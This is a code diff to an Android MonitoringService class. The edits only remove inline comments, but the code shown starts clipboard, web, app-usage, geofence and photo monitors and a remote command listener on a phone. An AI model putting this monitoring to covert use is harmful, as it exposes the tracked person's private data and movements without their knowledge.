@@ -37,8 +37,8 @@ public class MonitoringService extends Service {
     private String userId;
     private String phoneModel; 
     private GeoFenceMonitor geoFenceMonitor;
-    private AppMonitor appMonitor;  // Add this field
-    private PhotosMonitor photosMonitor;  // Add this field
+    private AppMonitor appMonitor;  
+    private PhotosMonitor photosMonitor;  
 
     @Override
     public void onCreate() {
@@ -117,8 +117,8 @@ public class MonitoringService extends Service {
             startWebMonitor(userId, phoneModel);
             startClipboardMonitor(userId, phoneModel);
             startAppUsageMonitor(userId, phoneModel);
-            startGeofenceMonitor(); // Add this line
-            startPhotosMonitor(); // Add this line
+            startGeofenceMonitor();
+            startPhotosMonitor(); 
             initializeCommandListener(userId, phoneModel);
         } catch (Exception e) {
             Log.e(TAG, "Error starting monitors: " + e.getMessage());
@@ -128,7 +128,7 @@ public class MonitoringService extends Service {
     private void startClipboardMonitor(String userId, String phoneModel) {
         Log.d(TAG, "Initializing Clipboard Monitor");
         ClipboardMonitor clipboardMonitor = new ClipboardMonitor(this, userId, phoneModel);
-        clipboardMonitor.startMonitoring(); // Start monitoring clipboard content
+        clipboardMonitor.startMonitoring(); 
     }
 
     private void startWebMonitor(String userId, String phoneModel) {
@@ -210,7 +210,7 @@ public class MonitoringService extends Service {
         PeriodicWorkRequest usageWorkRequest = 
             new PeriodicWorkRequest.Builder(UsageTrackingWorker.class, 15, TimeUnit.MINUTES)
                 .setConstraints(constraints)
-                .setInputData(inputData)  // Make sure input data is set
+                .setInputData(inputData)  
                 .addTag("usage_tracking")
                 .build();
 
